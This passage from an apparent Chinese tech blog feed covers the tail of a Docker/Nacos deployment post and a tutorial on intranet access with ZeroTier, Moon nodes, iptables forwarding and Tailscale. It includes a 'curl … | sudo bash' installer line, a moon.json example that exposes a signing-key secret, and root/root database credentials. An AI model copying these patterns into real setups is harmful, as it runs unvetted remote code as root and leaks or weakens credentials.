class="line">MYSQL_SERVICE_HOST=192.168.31.28</span><br><span class="line">MYSQL_SERVICE_DB_NAME=nacos</span><br><span class="line">MYSQL_SERVICE_PORT=3306</span><br><span class="line">MYSQL_SERVICE_USER=root</span><br><span class="line">MYSQL_SERVICE_PASSWORD=root</span><br><span class="line">MYSQL_SERVICE_DB_PARAM=characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=<span class="literal">true</span>&amp;useSSL=<span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="8、其他常用软件">8、其他常用软件</h2><p><a href="https://blog.xueqimiao.com/docker/cf2853/#_1%E3%80%81%E5%AE%89%E8%A3%85nginx" target="_blank" rel="noopener" title="Docker安装基本应用">Docker安装基本应用</a></p><p><a href="https://juejin.cn/post/7096276025180422157#heading-12" target="_blank" rel="noopener" title="最全的Docker-compose应用部署">最全的Docker-compose应用部署</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Docker常用应用部署&lt;/h1&gt;
&lt;h1&gt;一、Ubuntu系统Docker快速安装&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker官网安装文档：&lt;a href=&quot;https://docs.docker.com/engine/install/ubuntu/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://docs.docker.com/engine/install/ubuntu/&quot;&gt;https://docs.docker.com/engine/install/ubuntu/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="云原生" scheme="https://blog.shawncoding.top/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    
    <category term="docker" scheme="https://blog.shawncoding.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>局域网内网穿透技术</title>
    <link href="https://blog.shawncoding.top/posts/17947ff7.html"/>
    <id>https://blog.shawncoding.top/posts/17947ff7.html</id>
    <published>2023-06-28T14:20:36.000Z</published>
    <updated>2023-06-28T14:27:09.216Z</updated>
    
    <content type="html"><![CDATA[<h1>一、内网穿透概述</h1><h2 id="1、传统内网穿透介绍">1、传统内网穿透介绍</h2><p>传统内网穿透的方式为：内网设备&lt;——&gt;中转服务器&lt;———&gt;网络设备（手机、电脑），例如frp，nps，可以参考：<a href="https://blog.csdn.net/lemon_TT/article/details/124675640" target="_blank" rel="noopener" title="内网穿透工具">内网穿透工具</a>；但是这种方法弊端也很明显</p><ul><li>中转服务器需要一定的费用进行支撑(带公网的云服务器)，如果是外网的服务器还可能存在被墙的风险</li><li>中转服务器直接决定了中转的&quot;速度&quot;，而这个&quot;速度&quot;越快其对应的服务器带宽就越大，通常来说价格就越高</li><li>需要一定的知识储备来搭建内网穿透的服务端，而且只能转发某个特定的端口</li></ul><a id="more"></a><h2 id="2、ZeroTier和Tailscale">2、ZeroTier和Tailscale</h2><blockquote><p>关于打洞的知识可以参考：<a href="https://blog.csdn.net/lemon_TT/article/details/128846476" target="_blank" rel="noopener" title="NAT网络与内网穿透详解">NAT网络与内网穿透详解</a></p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202305301831275.png" alt></p><p>一般来说会优先进行打洞，打洞的时候连接：内网设备&lt;——&gt;移动、PC设备（手机、电脑），通常情况下是端到端的传输，如果网络环境差或者无法打洞也会借助中转服务器进行传输数据(自带的中间服务器在国外，最好自己部署一个自己的)。</p><p>加入到一个局域网后，能够穿透转发所有端口，正常情况下不依赖服务器进行中转传输文件，端到端连接，理论可以达到满带宽，同时也可以进行流量转发，实现一台机器加入网络，实现整个局域网的设备访问</p><h1>二、ZeroTier</h1><blockquote><p>官网地址：<a href="https://www.zerotier.com/" target="_blank" rel="noopener" title="https://www.zerotier.com/">https://www.zerotier.com/</a></p></blockquote><h2 id="1、概述">1、概述</h2><h3 id="1-1-介绍">1.1 介绍</h3><p>zerotier采用VLAN(虚拟局域网)技术将不同设备连接到一个“虚拟的局域网”中，从而让这些设备随时随地都可以互相访问，相比于<a href="https://blog.csdn.net/lemon_TT/article/details/124675640" target="_blank" rel="noopener" title="frp等其他内网穿透">frp等其他内网穿透</a>来说，组建虚拟局域网更安全更便捷，每台服务器上只需要安装对应的客户端，连接到同一个网络，就可以实现 IP 互相访问。在此之上，还有自定义 DNS 服务器的功能，将通过 IP 这个步骤转换为通过域名进行访问，相当实用，甚至可以在局域网的一台主机搭建，实现整个局域网的访问</p><p>ZeroTier所有的设备都是客户端，连接方式是点对点。在路由器下面的话是用 uPnP 的方式进行转发实现客户端到客户端的直接连接。如果 uPnP 没有开启，会通过传统的服务器转发的方式进行连接。</p><h3 id="1-2-相关概念">1.2 相关概念</h3><ul><li><strong>Earth</strong>。根据其介绍，将地球上的所有设备连起来。那这里的 Earth 指的就是整体的一个服务</li><li><strong>Network</strong>。每一个 Network 包含的所有设备都在同一个网络里。每个网络有一个 Network ID。各客户端通过这个 ID 连接到此网络。当然，一个账号是可以创建多个网络的。网络氛围 Public 和Private。一般我们自己组网是要用 Private，需要在页面授权设备才可以进行访问。<ul><li><strong>Planet</strong>。官方提供的服务器节点。各客户端都是通过这些服务来互相寻址的。相当于 zookeeper 的不同节点</li><li><strong>Moon</strong>。自定义的 Planet。由于 Zerotier 没有国内节点，在两个设备刚开始互连的时候有可能需要通过国外的节点寻址（不过我没发现有什么慢的）导致创建连接的速度偏慢。在自己的网络里搭建 Moon 可以使连接提速。</li><li><strong>Leaf</strong>。客户端。就是连接到网络上的每一个设备。其实经过测试，Moon 也是客户端的一种。这里特指没有额外功能，单纯用于连接的客户端</li></ul></li></ul><h2 id="2、ZeroTier简单使用">2、ZeroTier简单使用</h2><p>首先登陆官网进行账号注册：<a href="https://www.zerotier.com/" target="_blank" rel="noopener" title="https://www.zerotier.com/">https://www.zerotier.com/</a>，完成后点击创建好的网络，进入设置界面进行设置，创建网络，<strong>记住NETWORK ID，<strong>进入后</strong>选择PRIVATE网络</strong>(public加入不需要授权，不安全)，之后选择自己想要的网段，其他保持默认即可</p><p><img src="http://qnypic.shawncoding.top/blog/202305301831276.png" alt></p><p>然后根据不同平台下载客户端：<a href="http://zerotier.com/download/" target="_blank" rel="noopener" title="zerotier.com/download/">zerotier.com/download/</a>，举例linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://install.zerotier.com | sudo bash</span><br><span class="line"><span class="comment"># 安装完成后可以使用 systemctl 命令来控制服务</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> zerotier-one.service</span><br><span class="line">sudo systemctl start zerotier-one.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看节点列表</span></span><br><span class="line">sudo zerotier-cli listpeers</span><br><span class="line"><span class="comment"># 查看安装的zerotier版本</span></span><br><span class="line">sudo zerotier-cli status</span><br><span class="line"><span class="comment"># 加入一个network</span></span><br><span class="line">sudo zerotier-cli join 17d7094***********（填写自己的 networkid）</span><br><span class="line"><span class="comment"># 退出一个network</span></span><br><span class="line">sudo zerotier-cli leave 17d709************（填写自己的 networkid）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看监听的列表</span></span><br><span class="line">sudo zerotier-cli peers</span><br><span class="line">sudo zerotier-cli listpeers</span><br><span class="line"><span class="comment"># 列出加入的网络信息</span></span><br><span class="line">sudo zerotier-cli listnetworks</span><br><span class="line"><span class="comment"># 卸载已安装版本</span></span><br><span class="line"><span class="comment"># Debian/Ubuntu 发行版卸载方法</span></span><br><span class="line">sudo dpkg -P zerotier-one</span><br><span class="line">sudo rm -rf /var/lib/zerotier-one/</span><br><span class="line"><span class="comment"># Redhat/CentOS 发行版卸载方法</span></span><br><span class="line">sudo rpm -e zerotier-one</span><br><span class="line">sudo rm -rf /var/lib/zerotier-one/</span><br></pre></td></tr></table></figure><p>开始授权，可以选择设置按钮自行设置设备的ip，默认就是系统随机分配</p><p><img src="http://qnypic.shawncoding.top/blog/202305301831278.png" alt></p><p>windows类似，加入网络授权后，即可访问加入这个局域网中的所有设备了</p><h2 id="3、Moon搭建">3、Moon搭建</h2><h3 id="3-1-介绍">3.1 介绍</h3><blockquote><p>官方手册部署 <a href="https://www.zerotier.com/manual.shtml#4_4" target="_blank" rel="noopener" title="Moon">Moon</a></p></blockquote><p>Moon 节点可以是具有固定 IP 的公网设备，也可以是具有物理 IP 的内网设备. 如果使用内网设备，依然需要借助官方根服务器作为中间链路. 因此，这里我们在云服务器上搭建 Moon 服务，在机器 C 上部署 ZeroTier Moon 首先需要安装 ZeroTier One 将其部署为为 ZeroTier Node(参考前一节)；当然如果打洞不成功也需要走moon流量</p><h3 id="3-2-部署Moon服务">3.2 部署Moon服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 root 账户</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="comment"># 进入 ZeroTier HOME 目录</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/zerotier-one/</span><br><span class="line"><span class="comment"># 获取 moon.json 文件</span></span><br><span class="line">zerotier-idtool initmoon identity.public &gt;&gt;moon.json</span><br><span class="line"><span class="comment"># 在 moon.json 文件中添加公网 IP(s)</span></span><br><span class="line"><span class="comment"># moon.json 文件中的 "id": "deadbeef00" 就是公网机器 的 ZeroTier Node ID</span></span><br><span class="line"><span class="comment"># 修改 “stableEndpoints” 为机器 的公网的 ip,然后注意端口的开放，这里多个ip也可以填写，包括ipv6</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">"id"</span>: <span class="string">"7818fa6036"</span>,</span><br><span class="line"> <span class="string">"objtype"</span>: <span class="string">"world"</span>,</span><br><span class="line"> <span class="string">"roots"</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="string">"identity"</span>: <span class="string">"7818fa6036:0:90a5291289a5b9f469230c138e6d34811a40df7aa2398099ad9a3e3d453c6f7f7cb1ea7cce745dd2f3005348364f7622e240ab400832cc724dc42549e4309106"</span>,</span><br><span class="line">   <span class="string">"stableEndpoints"</span>: [<span class="string">"1.2.3.4/9993"</span>]</span><br><span class="line">  &#125;</span><br><span class="line"> ],</span><br><span class="line"> <span class="string">"signingKey"</span>: <span class="string">"9d081af8144cf01201f491484f8c3cbcd9669fe4d549c790a13eb14924417167a6d94f5b32516e78c47b1a3c0362454d297c17e5f0b5bb42b903600838349b6a"</span>,</span><br><span class="line"> <span class="string">"signingKey_SECRET"</span>: <span class="string">"ab9634fe2146564bf7a049b9eee41e1b9e092a19a5f743e39360f4130840c83a87aecca1f9f5dd39df08ac8a2af1b68fef7cb7f56f002f66f00bf4d02eecbbd4"</span>,</span><br><span class="line"> <span class="string">"updatesMustBeSignedBy"</span>: <span class="string">"9d081af8144cf01201f491484f8c3cbcd9669fe4d549c790a13eb14924417167a6d94f5b32516e78c47b1a3c0362454d297c17e5f0b5bb42b903600838349b6a"</span>,</span><br><span class="line"> <span class="string">"worldType"</span>: <span class="string">"moon"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 7818fa6036就是机器的 ZeroTier Node ID</span></span><br><span class="line"><span class="comment"># 然后设置 0000007818fa6036.moon 签名文件</span></span><br><span class="line"><span class="comment"># 修改完 moon.json 文件后，获取 000000deadbeef00.moon 签名文件</span></span><br><span class="line">zerotier-idtool genmoon moon.json</span><br><span class="line"><span class="comment"># 此时，在 /var/lib/zerotier-one/ 下产生 0000007818fa6036.moon 文件就是机器的 ZeroTier Node ID.</span></span><br><span class="line"><span class="comment"># 新建 moons.d 目录，并将 000000deadbeef00.moon 文件移动到其下：</span></span><br><span class="line">mkdir moons.d</span><br><span class="line">mv 0000007818fa6036.moon moons.d</span><br><span class="line"><span class="comment"># 重启 ZeroTier One 服务，激活设置</span></span><br><span class="line">service zerotier-one restart</span><br><span class="line"><span class="comment"># 查看moon</span></span><br><span class="line">sudo zerotier-cli listmoons</span><br></pre></td></tr></table></figure><h3 id="3-3-使用-Moon-服务">3.3 使用 Moon 服务</h3><p>要想使用 Moon 服务，还需要在机器上添加签名文件，有两种方式：手动添加；命令行通过 ZeroTier Root Server 添加，添加后会发现延迟显著降低</p><p><strong>手动添加签名文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 ZeroTier One 的 HOME 目录新建 moons.d 目录， 将 1.3 小节中产生的 0000007818fa6036.moon 拷贝出来并放入 &#123;ZeroTier_One_HOME&#125;\moons.d 目录中</span></span><br><span class="line"><span class="comment"># 以下是各种操作系统中 ZeroTier One 默认的 HOME 目录：</span></span><br><span class="line">Linux: /var/lib/zerotier-one</span><br><span class="line">FreeBSD / OpenBSD: /var/db/zerotier-one</span><br><span class="line">Mac: /Library/Application Support/ZeroTier/One</span><br><span class="line">Windows: C:\Program Files (x86)\ZeroTier\One</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------windows</span></span><br><span class="line"><span class="comment"># 在 \ProgramData\ZeroTier\One 下建立 moons.d 目录，并将 0000007818fa6036.moon 拷贝放入</span></span><br><span class="line"><span class="comment"># 然后重启 ZeroTier One 服务.win + R 打开运行，输入 services.msc 打开服务，选择 ZeroTier One 服务并重新启动</span></span><br><span class="line"><span class="comment"># 测试，在 \Program Files (x86)\ZeroTier\One 下打开 cmd，测试 MOON 节点是否添加成功</span></span><br><span class="line"><span class="comment"># 如果出现你的公网ip就代表成功</span></span><br><span class="line">zerotier-cli.bat listpeers</span><br><span class="line"><span class="comment">#----------------------------------linux</span></span><br><span class="line"><span class="comment"># Ubuntu 操作系统中 ZeroTier One HOME 目录为 /var/lib/zerotier-one，建立 moons.d 目录，并将 000000deadbeef00.moon 拷贝放入</span></span><br><span class="line"><span class="comment"># 重新启动 ZeroTier One 服务</span></span><br><span class="line">sudo service zerotier-one restart</span><br><span class="line"><span class="comment"># 测试，出现 MOON 标识的节点标识添加成功</span></span><br><span class="line">sudo zerotier-cli listpeers</span><br></pre></td></tr></table></figure><p><strong>命令添加</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows下，填写自己的node id,然后重启</span></span><br><span class="line">C:\Program Files (x86)\ZeroTier\One&gt;zerotier-cli.bat orbit 7818fa6036 7818fa6036   <span class="comment"># deadbeef00 twice</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 下</span></span><br><span class="line">sudo zerotier-cli orbit 7818fa6036 7818fa6036 <span class="comment"># deadbeef00 twice</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行实际上是通过 ZeroTier 根服务器将 0000007818fa6036.moon 拷贝放入 &#123;ZeroTier_One_HOME&#125;/moons.d 目录中. 由于网络原因，可能会有延迟或无效的情况，重复、等待或使用手动方式.</span></span><br><span class="line"><span class="comment"># 重启 ZeroTier One 服务是非常重要的步骤，不重启 ZeroTier One 服务将无法激活设置.</span></span><br></pre></td></tr></table></figure><h2 id="4、流量转发与局域网访问">4、流量转发与局域网访问</h2><h3 id="4-1-概述">4.1 概述</h3><blockquote><p>可以参考：<a href="https://github.com/aturl/awesome-anti-gfw/blob/master/ZeroTier/ZeroTier' target=" _blank" rel="noopener" s_vpn.md" title="zerotier转发客户端流量">zerotier转发客户端流量</a></p></blockquote><p>那么如何让一台局域网外的电脑访问局域网内所有设备呢，但是又不想让所有设备都安装zerotier，这时，仅使用** Ubuntu 上的 linux 内核的数据转发和 iptables 控制路由**就能实现所需功能(相当于science上网的功能)</p><h3 id="4-2-转发服务器配置">4.2 转发服务器配置</h3><p>首先需要配置内网中一台 Linux 的数据转发和路由控制，Linux 系统内核可以通过 <code>sysctl</code> 和 <code>iptables</code> 两个命令控制网络数据转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核 IP 转发设置，0 表示处于关闭状态</span></span><br><span class="line">sudo sysctl net.ipv4.ip_forward</span><br><span class="line"><span class="comment"># 编辑配置文件开启 Linxu 内核的 IP 数据转发</span></span><br><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 将第 28 行的注释去掉，设置 net.ipv4.ip_forward=1</span></span><br><span class="line">net.ipv4.ip_forward=1    <span class="comment"># lin 28</span></span><br><span class="line"><span class="comment"># 激活配置文件设置</span></span><br><span class="line">sudo sysctl -p</span><br><span class="line"><span class="comment"># 查看内核 IP 转发设置，1 表示开启状态</span></span><br><span class="line">sudo sysctl net.ipv4.ip_forward</span><br><span class="line"><span class="comment"># 查看网口信息，下面两个都可以，可以发现有两个网卡，一个真实的一个zerotier提供的</span></span><br><span class="line">ifconfig</span><br><span class="line">ip link show</span><br><span class="line"><span class="comment"># ----------------------使用iptables开启流量转发--------------</span></span><br><span class="line"><span class="comment"># 注意下列网卡都需要换成自己的网卡信息</span></span><br><span class="line"><span class="comment"># 使用 iptables 启用 enp123s0f0 的网络地址转换和 IP 伪装</span></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o enp123s0f0 -j MASQUERADE</span><br><span class="line"><span class="comment"># 允许流量转发和跟踪活动连接</span></span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment"># 接下来设置从zt7u3fcxwr 到 enp123s0f0 流量转发； 反向规则不是必需的，原理同理</span></span><br><span class="line">sudo iptables -A FORWARD -i zt7u3fcxwr -o enp123s0f0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------保存路由规则--------------------------------</span></span><br><span class="line"><span class="comment"># iptables 规则在重新启动后就无效了. 将上面设置保存为配置文件中，这里我是用的是ubuntu20，centos原理类似</span></span><br><span class="line"><span class="comment"># 安装 iptables 配置存储工具</span></span><br><span class="line">sudo apt-get install iptables-persistent</span><br><span class="line"><span class="comment"># 保存 iptables 配置到文件</span></span><br><span class="line">sudo netfilter-persistent save</span><br><span class="line"><span class="comment"># 查看 iptables 配置文件内容,配置文件保存路径在 /etc/iptables/ 目录下</span></span><br><span class="line">sudo iptables-save</span><br></pre></td></tr></table></figure><p>然后需要配置 ZeroTier 网络路由管理，打开控制台：<a href="https://my.zerotier.com/" target="_blank" rel="noopener" title="https://my.zerotier.com/">https://my.zerotier.com/</a>，增加 1 条路由，Destination 填入 <code>0.0.0.0/0</code> 表示全网，(via) 填入 <code>zt7u3fcxwr</code> 的 IP 地址，点击 <code>Submit</code> 提交。意思就是将流量通过via转发，相当于把Via当作网关，也可以自定义特定的网关</p><p><img src="http://qnypic.shawncoding.top/blog/202305301831279.png" alt></p><p>这里再举个例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设zerotier虚拟局域网的网段是192.168.88.0 局域网A 192.168.1.0 局域网B 192.168.2.0</span></span><br><span class="line"><span class="comment"># (如果需要互联)在局域网A和B中需要各有一台主机安装zerotier并作为两个内网互联的网关</span></span><br><span class="line"><span class="comment"># 分别是192.168.1.10（192.168.88.10） 192.168.2.10（192.168.88.20）#括号里面为虚拟局域网的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在zerotier网站的networks里面的Managed Routes下配置路由表</span></span><br><span class="line"><span class="comment">#如果单向连接,仅需填写下方一个即可.</span></span><br><span class="line">192.168.1.0/24 via 192.168.88.10 </span><br><span class="line">192.168.2.0/24 via 192.168.88.20 </span><br><span class="line"><span class="comment"># 开启内核转发</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.ipv4.ip_forward = 1"</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br><span class="line"><span class="comment"># 防火墙设置</span></span><br><span class="line">iptables -I FORWARD -i ztyqbub6jp -j ACCEPT</span><br><span class="line">iptables -I FORWARD -o ztyqbub6jp -j ACCEPT</span><br><span class="line">iptables -t nat -I POSTROUTING -o ztyqbub6jp -j MASQUERADE</span><br><span class="line"><span class="comment">#其中的 ztyqbub6jp 在不同的机器中不一样，你可以在路由器ssh环境中用 zerotier-cli listnetworks 或者 ifconfig 查询zt开头的网卡名</span></span><br><span class="line">iptables-save <span class="comment">#保存配置到文件,否则重启规则会丢失.</span></span><br></pre></td></tr></table></figure><h3 id="4-3-客户端配置">4.3 客户端配置</h3><p>Windows 可以使用客户端，需要勾选 <code>Allow Global IP</code>.</p><ul><li>开启转发代理：<strong>勾选</strong> <code>Allow Default Route</code></li><li>关闭转发代理：<strong>取消</strong> <code>Allow Default Route</code></li></ul><p>对于Linux来说，启用 ZeroTIer转发代理需要设置内核，使内核允许发送数据的地址和接受数据的地址不同. 默认情况下，当发送地址与接受地址不一致的时候，内核会丢弃接收的数据.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑 /etc/sysctl.conf 文件</span></span><br><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 去掉第 20 行注释，并设置如下</span></span><br><span class="line">net.ipv4.conf.all.rp_filter=2    <span class="comment"># line 20</span></span><br><span class="line"><span class="comment"># 0：不开启源地址校验。</span></span><br><span class="line"><span class="comment"># 1：开启严格的反向路径校验。对每个进来的数据包，校验其反向路径是否是最佳路径。如果反向路径不是最佳路径，则直接丢弃该数据包。</span></span><br><span class="line"><span class="comment"># 2：开启松散的反向路径校验。对每个进来的数据包，校验其源地址是否可达，即反向路径是否能通（通过任意网口），如果反向路径不同，则直接丢弃该数据包</span></span><br><span class="line"><span class="comment"># 激活配置文件设置</span></span><br><span class="line">sudo sysctl -p</span><br><span class="line"><span class="comment"># 注意下面的NetworkID 换成自己的局域网id</span></span><br><span class="line"><span class="comment"># 允许 ZeroTier One 转发全局流量</span></span><br><span class="line">sudo zerotier-cli <span class="built_in">set</span> NetworkID allowGlobal=1</span><br><span class="line"><span class="comment"># 开启转发代理</span></span><br><span class="line">sudo zerotier-cli <span class="built_in">set</span> NetworkID allowDefault=1</span><br><span class="line"><span class="comment"># 关闭转发代理</span></span><br><span class="line">sudo zerotier-cli <span class="built_in">set</span> NetworkID allowDefault=0</span><br><span class="line"><span class="comment"># 如果开启转代理后没有正常工作，可以尝试重启 ZeroTier One 服务或重启计算机.</span></span><br><span class="line">sudo systemctl restart zerotier-one.service</span><br></pre></td></tr></table></figure><p>最后进行测试，能ping通局域网表示成功，打开转发代理，访问<code>curl http://myip.ipip.net/</code>，如果显示的isp和局域网的一样，说明成功</p><h1>三、Tailscale</h1><h2 id="1、概述-v2">1、概述</h2><blockquote><p>官网：<a href="https://tailscale.com/" target="_blank" rel="noopener" title="https://tailscale.com/">https://tailscale.com/</a></p></blockquote><h3 id="1-1-Tailscale简介">1.1 Tailscale简介</h3><p>Tailscale 是一种基于 WireGuard 的虚拟组网工具，和 Netmaker 类似，<strong>最大的区别在于 Tailscale 是在用户态实现了 WireGuard 协议，而 Netmaker 直接使用了内核态的 WireGuard</strong>。所以 Tailscale 相比于内核态 WireGuard 性能会有所损失，</p><p>Tailscale 就是一种利用 NAT 穿透(P2P 穿透)技术的 内网穿透工具.。Tailscale 客户端等是开源的, 不过遗憾的是中央控制服务器目前并不开源; Tailscale 目前也提供免费的额度给用户使用, 在 NAT 穿透成功的情况下也能保证满速运行。不过一旦无法 NAT 穿透需要做中转时, Tailscale 官方的服务器由于众所周知的原因，在国内访问速度很拉胯; 不过有一个开源版本的中央控制服务器(Headscale), 也就是说: <strong>我们可以自己搭建中央服务器, 完全 &quot;自主可控&quot;</strong></p><h3 id="1-2-优势">1.2 优势</h3><ul><li>开箱即用：无需配置防火墙；没有额外的配置</li><li>高安全性/私密性：自动密钥轮换；点对点连接；支持用户审查端到端的访问记录</li><li>在原有的 ICE、STUN 等 UDP 协议外，实现了 DERP TCP 协议来实现 NAT 穿透</li><li>基于公网的控制服务器下发 ACL 和配置，实现节点动态更新</li><li>通过第三方（如 Google） SSO 服务生成用户和私钥，实现身份认证</li></ul><p>当然Tailscale 是一款商业产品，个人用户在接入设备不超过 20 台的情况下是可以免费使用的（虽然有一些限制，比如子网网段无法自定义，且无法设置多个子网）。除 Windows 和 macOS 的图形应用程序外，其他 Tailscale 客户端的组件（包含 Android 客户端）是在 BSD 许可下以开源项目的形式开发的，你可以在他们的 <a href="https://github.com/tailscale/" target="_blank" rel="noopener" title="GitHub 仓库">GitHub 仓库</a>找到各个操作系统的客户端源码</p><h3 id="1-3-Headscale-是什么">1.3 Headscale 是什么</h3><p>Tailscale 的控制服务器是不开源的，而且对免费用户有诸多限制。目前有一款开源的实现叫 <a href="https://github.com/juanfont/headscale" target="_blank" rel="noopener" title="Headscale">Headscale</a>，Headscale 由欧洲航天局的 Juan Font 使用 Go 语言开发，在 BSD 许可下发布，实现了 Tailscale 控制服务器的所有主要功能，可以部署在企业内部，没有任何设备数量的限制，且所有的网络流量都由自己控制。</p><h2 id="2、基本使用">2、基本使用</h2><h3 id="2-1-节点互相访问">2.1 节点互相访问</h3><blockquote><p>对应软件安装教程：<a href="https://tailscale.com/download/linux" target="_blank" rel="noopener" title="https://tailscale.com/download/linux">https://tailscale.com/download/linux</a></p></blockquote><ul><li>首先需要有个账号，使用自己已有的谷歌、Git或者微软账户登入系统</li><li>根据设备类型的不同，按照官方教程安装服务，注意，iOS需要有美区账户才能下载客户端</li><li>安装后，Linux执行<code>tailscale up</code>，会提示登录鉴权的url，其他客户端的Login或者Auth会拉起登录链接到浏览器，登入你的账户即可将节点加入局域网</li><li>最后，在 <a href="https://login.tailscale.com/admin/machines" target="_blank" rel="noopener" title="Tailscale 后台管理">Tailscale 后台管理</a> 即可查看节点的IP，并通过IP访问你的节点</li></ul><h3 id="2-2-访问局域网设备">2.2 访问局域网设备</h3><blockquote><p>只要局域网一台设备安装了Tailscale即可访问所有设备，这里以ubuntu20作为转发机器，一般来说也都是linux作为转发，参考:<a href="https://tailscale.com/kb/1019/subnets/" target="_blank" rel="noopener" title="https://tailscale.com/kb/1019/subnets/">https://tailscale.com/kb/1019/subnets/</a></p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202305301831280.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 